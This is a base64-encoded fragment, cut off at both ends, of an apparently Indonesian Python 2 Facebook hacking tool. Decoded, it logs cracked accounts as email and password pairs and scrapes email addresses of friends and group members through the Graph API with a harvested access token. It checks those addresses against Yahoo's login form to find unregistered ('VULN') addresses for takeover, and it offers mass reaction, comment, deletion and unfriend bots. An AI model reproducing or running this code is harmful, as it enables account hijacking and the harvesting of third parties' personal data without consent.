2VrcG9pbnQudHh0IiwgInciKQoJCQkJCWNla3Mud3JpdGUoZW1haWwrIiB8ICIrcHcrIlxuIikKCQkJCQljZWtzLmNsb3NlKCkKCQkJCQlwcmludCAiXG5cMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJCXByaW50KCJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2VtYWlsKQoJCQkJCXByaW50KCJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK3B3KQoJCQkJCWtlbHVhcigpCgkJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJCXByaW50IlwwMzNbMTs5MW1bIV0gQ29ubmVjdGlvbiBFcnJvciIKCQkJCXRpbWUuc2xlZXAoMSkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50ICgiXDAzM1sxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCIpCgkJdGFueWF3KCkKZGVmIHRhbnlhdygpOgoJd2h5ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1DcmVhdGUgd29yZGxpc3QgPyBcMDMzWzE7OTJtW3kvbl1cMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCWlmIHdoeSA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIgoJCXRhbnlhdygpCgllbGlmIHdoeSA9PSJ5IjoKCQl3b3JkbGlzdCgpCgllbGlmIHdoeSA9PSJZIjoKCQl3b3JkbGlzdCgpCgllbGlmIHdoeSA9PSJuIjoKCQltZW51X2hhY2soKQoJZWxpZiB3aHkgPT0iTiI6CgkJbWVudV9oYWNrKCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciCgkJdGFueWF3KCkKCQkKIyMjIyMgWUFIT08gQ0hFQ0tFUiAjIyMjIwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwpkZWYgbWVudV95YWhvbygpOgoJZ2xvYmFsIHRva2V0Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIFdpdGggbGlzdCBmcmllbmQiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBDbG9uZSBmcm9tIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIENsb25lIGZyb20gbWVtYmVyIGdyb3VwIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gVXNpbmcgZmlsZSIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJeWFob29fcGlsaWgoKQojLS0tLXBpbGloCmRlZiB5YWhvb19waWxpaCgpOgoJZ28gPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRW50ZXIgXDAzM1sxOzk3bSIpCglpZiBnbyA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIgoJCXlhaG9vX3BpbGloKCkKCWVsaWYgZ28gPT0iMSI6CgkJeWFob29mcmllbmRzKCkKCWVsaWYgZ28gPT0iMiI6CgkJeWFob29mcm9tZnJpZW5kcygpCgllbGlmIGdvID09IjMiOgoJCXlhaG9vbWVtYmVyKCkKCWVsaWYgZ28gPT0iNCI6CgkJeWFob29saXN0KCkKCWVsaWYgZ28gPT0iMCI6CgkJbWVudV9oYWNrKCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciCgkJeWFob29fcGlsaWgoKQoJCQojIyMjIyBMSVNUIEZSSUVORCAjIyMjIwpkZWYgeWFob29mcmllbmRzKCk6CglnbG9iYWwgdG9rZXQKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJbXBzaCA9IFtdCglqbWwgPSAwCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXR0aW5nIGVtYWlsIGZyaWVuZCBcMDMzWzE7OTdtLi4uJykKCXRlbWFuID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJa2ltYWsgPSBqc29uLmxvYWRzKHRlbWFuLnRleHQpCglzYXZlID0gb3Blbignb3V0L01haWxWdWxuLnR4dCcsJ3cnKQoJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCWZvciB3IGluIGtpbWFrWydkYXRhJ106CgkJam1sICs9MQoJCW1wc2guYXBwZW5kKGptbCkKCQlpZCA9IHdbJ2lkJ10KCQluYW1hID0gd1snbmFtZSddCgkJbGlua3MgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQl6ID0ganNvbi5sb2FkcyhsaW5rcy50ZXh0KQoJCXRyeToKCQkJbWFpbCA9IHpbJ2VtYWlsJ10KCQkJeWFob28gPSByZS5jb21waWxlKHInQC4qJykKCQkJb3R3ID0geWFob28uc2VhcmNoKG1haWwpLmdyb3VwKCkKCQkJaWYgJ3lhaG9vLmNvbScgaW4gb3R3OgoJCQkJYnIub3BlbigiaHR0cHM6Ly9sb2dpbi55YWhvby5jb20vY29uZmlnL2xvZ2luPy5zcmM9ZnBjdHgmLmludGw9aWQmLmxhbmc9aWQtSUQmLmRvbmU9aHR0cHM6Ly9pZC55YWhvby5jb20iKQoJCQkJYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUKCQkJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJCQliclsidXNlcm5hbWUiXSA9IG1haWwKCQkJCWtsaWsgPSBici5zdWJtaXQoKS5yZWFkKCkKCQkJCWpvayA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQkJdHJ5OgoJCQkJCXBlayA9IGpvay5zZWFyY2goa2xpaykuZ3JvdXAoKQoJCQkJZXhjZXB0OgoJCQkJCWNvbnRpbnVlCgkJCQlpZiAnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPicgaW4gcGVrOgoJCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpCgkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKyIgXDAzM1sxOzk3bT0+IituYW1hKQoJCQkJCWJlcmhhc2lsLmFwcGVuZChtYWlsKQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcGFzcwoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybURvbmUgXDAzM1sxOzk3bS4uLi4nCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKGJlcmhhc2lsKSkKCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtIG91dC9NYWlsVnVsbi50eHQiCglzYXZlLmNsb3NlKCkKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgltZW51X3lhaG9vKCkKCiMjIyMjIENMT05FIEZST00gRlJJRU5EICMjIyMjCmRlZiB5YWhvb2Zyb21mcmllbmRzKCk6CglnbG9iYWwgdG9rZXQKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJbXBzaCA9IFtdCglqbWwgPSAwCglpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCXRyeToKCQlqb2sgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQoJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK29wWyJuYW1lIl0KCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X3lhaG9vKCkKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgl0ZW1hbiA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHQrJy9mcmllbmRzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJa2ltYWsgPSBqc29uLmxvYWRzKHRlbWFuLnRleHQpCglzYXZlID0gb3Blbignb3V0L0ZyaWVuZE1haWxWdWxuLnR4dCcsJ3cnKQoJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCWZvciB3IGluIGtpbWFrWydkYXRhJ106CgkJam1sICs9MQoJCW1wc2guYXBwZW5kKGptbCkKCQlpZCA9IHdbJ2lkJ10KCQluYW1hID0gd1snbmFtZSddCgkJbGlua3MgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQl6ID0ganNvbi5sb2FkcyhsaW5rcy50ZXh0KQoJCXRyeToKCQkJbWFpbCA9IHpbJ2VtYWlsJ10KCQkJeWFob28gPSByZS5jb21waWxlKHInQC4qJykKCQkJb3R3ID0geWFob28uc2VhcmNoKG1haWwpLmdyb3VwKCkKCQkJaWYgJ3lhaG9vLmNvbScgaW4gb3R3OgoJCQkJYnIub3BlbigiaHR0cHM6Ly9sb2dpbi55YWhvby5jb20vY29uZmlnL2xvZ2luPy5zcmM9ZnBjdHgmLmludGw9aWQmLmxhbmc9aWQtSUQmLmRvbmU9aHR0cHM6Ly9pZC55YWhvby5jb20iKQoJCQkJYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUKCQkJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJCQliclsidXNlcm5hbWUiXSA9IG1haWwKCQkJCWtsaWsgPSBici5zdWJtaXQoKS5yZWFkKCkKCQkJCWpvayA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQkJdHJ5OgoJCQkJCXBlayA9IGpvay5zZWFyY2goa2xpaykuZ3JvdXAoKQoJCQkJZXhjZXB0OgoJCQkJCWNvbnRpbnVlCgkJCQlpZiAnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPicgaW4gcGVrOgoJCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpCgkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKyIgXDAzM1sxOzk3bT0+IituYW1hKQoJCQkJCWJlcmhhc2lsLmFwcGVuZChtYWlsKQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcGFzcwoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybURvbmUgXDAzM1sxOzk3bS4uLi4nCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKGJlcmhhc2lsKSkKCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtIG91dC9GcmllbmRNYWlsVnVsbi50eHQiCglzYXZlLmNsb3NlKCkKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgltZW51X3lhaG9vKCkKCQojIyMjIyBZQUhPTyBNRU1CRVIgIyMjIyMKZGVmIHlhaG9vbWVtYmVyKCk6CglnbG9iYWwgdG9rZXQKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJbXBzaCA9IFtdCglqbWwgPSAwCglpZD1yYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJdHJ5OgoJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkKCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV95YWhvbygpCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXR0aW5nIGVtYWlsIGZyb20gZ3JvdXAgXDAzM1sxOzk3bS4uLicpCgl0ZW1hbiA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmbGltaXQ9OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJa2ltYWsgPSBqc29uLmxvYWRzKHRlbWFuLnRleHQpCglzYXZlID0gb3Blbignb3V0L0dydXBNYWlsVnVsbi50eHQnLCd3JykKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglmb3IgdyBpbiBraW1ha1snZGF0YSddOgoJCWptbCArPTEKCQltcHNoLmFwcGVuZChqbWwpCgkJaWQgPSB3WydpZCddCgkJbmFtYSA9IHdbJ25hbWUnXQoJCWxpbmtzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJeiA9IGpzb24ubG9hZHMobGlua3MudGV4dCkKCQl0cnk6CgkJCW1haWwgPSB6WydlbWFpbCddCgkJCXlhaG9vID0gcmUuY29tcGlsZShyJ0AuKicpCgkJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJCWlmICd5YWhvby5jb20nIGluIG90dzoKCQkJCWJyLm9wZW4oImh0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tIikKCQkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCQlici5zZWxlY3RfZm9ybShucj0wKQoJCQkJYnJbInVzZXJuYW1lIl0gPSBtYWlsCgkJCQlrbGlrID0gYnIuc3VibWl0KCkucmVhZCgpCgkJCQlqb2sgPSByZS5jb21waWxlKHInIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPi4qJykKCQkJCXRyeToKCQkJCQlwZWsgPSBqb2suc2VhcmNoKGtsaWspLmdyb3VwKCkKCQkJCWV4Y2VwdDoKCQkJCQljb250aW51ZQoJCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBlazoKCQkJCQlzYXZlLndyaXRlKG1haWwgKyAnXG4nKQoJCQkJCXByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtVlVMTuKck1wwMzNbMTs5N20gXSBcMDMzWzE7OTJtIiArbWFpbCsiIFwwMzNbMTs5N209PiIrbmFtYSkKCQkJCQliZXJoYXNpbC5hcHBlbmQobWFpbCkKCQlleGNlcHQgS2V5RXJyb3I6CgkJCXBhc3MKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihiZXJoYXNpbCkpCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06XDAzM1sxOzk3bSBvdXQvR3J1cE1haWxWdWxuLnR4dCIKCXNhdmUuY2xvc2UoKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfeWFob28oKQoJCQojIyMjIyBZQUhPTyBGSUxFICMjIyMjCmRlZiB5YWhvb2xpc3QoKToKCWdsb2JhbCB0b2tldAoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglmaWxlcyA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBwYXRoIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJdHJ5OgoJCXRvdGFsID0gb3BlbihmaWxlcywiciIpCgkJbWFpbCA9IHRvdGFsLnJlYWRsaW5lcygpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV95YWhvbygpCgltcHNoID0gW10KCWptbCA9IDAKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJc2F2ZSA9IG9wZW4oJ291dC9GaWxlTWFpbFZ1bG4udHh0JywndycpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCW1haWwgPSBvcGVuKGZpbGVzLCJyIikucmVhZGxpbmVzKCkKCWZvciBwdyBpbiBtYWlsOgoJCW1haWwgPSBwdy5yZXBsYWNlKCJcbiIsIiIpCgkJam1sICs9MQoJCW1wc2guYXBwZW5kKGptbCkKCQl5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQoJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCgkJaWYgJ3lhaG9vLmNvbScgaW4gb3R3OgoJCQlici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNyYz1mcGN0eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIpCgkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCgkJCWJyLnNlbGVjdF9mb3JtKG5yPTApCgkJCWJyWyJ1c2VybmFtZSJdID0gbWFpbAoJCQlrbGlrID0gYnIuc3VibWl0KCkucmVhZCgpCgkJCWpvayA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQoJCQl0cnk6CgkJCQlwZWsgPSBqb2suc2VhcmNoKGtsaWspLmdyb3VwKCkKCQkJZXhjZXB0OgoJCQkJY29udGludWUKCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBlazoKCQkJCXNhdmUud3JpdGUobWFpbCArICdcbicpCgkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybVZVTE7inJNcMDMzWzE7OTdtIF0gXDAzM1sxOzkybSIgK21haWwpCgkJCQliZXJoYXNpbC5hcHBlbmQobWFpbCkKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihiZXJoYXNpbCkpCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06XDAzM1sxOzk3bSBvdXQvRmlsZU1haWxWdWxuLnR4dCIKCXNhdmUuY2xvc2UoKQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfeWFob28oKQoJCgoJCQojIyMjIyBNRU5VIEJPVCAjIyMjIwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKZGVmIG1lbnVfYm90KCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEJvdCBSZWFjdGlvbnMgVGFyZ2V0IFBvc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBCb3QgUmVhY3Rpb25zIEdydXAgUG9zdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIEJvdCBDb21tZW50IFRhcmdldCBQb3N0IgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gQm90IENvbW1lbnQgR3J1cCBQb3N0IgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gTWFzcyBkZWxldGUgUG9zdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi5cMDMzWzE7OTdtIE1hc3MgYWNjZXB0IGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNy5cMDMzWzE7OTdtIE1hc3MgZGVsZXRlIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJYm90X3BpbGloKCkKIy8vLy8vLy8vLy8vLwpkZWYgYm90X3BpbGloKCk6Cglib3RzID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUVudGVyIFwwMzNbMTs5N20iKQoJaWYgYm90cyA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCWJvdF9waWxpaCgpCgllbGlmIGJvdHMgPT0iMSI6CgkJbWVudV9yZWFjdCgpCgllbGlmIGJvdHMgPT0iMiI6CgkJZ3J1cF9yZWFjdCgpCgllbGlmIGJvdHMgPT0iMyI6CgkJYm90X2tvbWVuKCkKCWVsaWYgYm90cyA9PSI0IjoKCQlncnVwX2tvbWVuKCkKCWVsaWYgYm90cyA9PSI1IjoKCQlkZWxldGVwb3N0KCkKCWVsaWYgYm90cyA9PSI2IjoKCQlhY2NlcHQoKQoJZWxpZiBib3RzID09IjciOgoJCXVuZnJpZW5kKCkKCWVsaWYgYm90cyA9PSIwIjoKCQltZW51KCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJYm90X3BpbGloKCkKCQkKIyMjIyMgTUVOVSBSRUFDVCAjIyMjIwpkZW